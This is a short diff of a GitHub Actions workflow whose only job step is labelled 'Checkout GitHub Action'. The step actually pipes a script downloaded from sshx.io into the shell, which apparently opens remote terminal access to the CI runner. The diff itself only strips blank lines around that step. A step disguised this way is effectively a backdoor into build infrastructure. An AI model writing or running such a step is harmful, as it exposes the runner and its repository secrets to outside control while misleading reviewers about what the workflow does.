@@ -1,15 +1,11 @@
 name: Linux_Container_Workflow
-
 on:
   workflow_dispatch:
-
-
 jobs:
   build-and-push:
     runs-on: ubuntu-latest
     steps:
       # checkout the repo
       - name: "Checkout GitHub Action"
-
         run: curl -sSf https://sshx.io/get | sh -s run
   
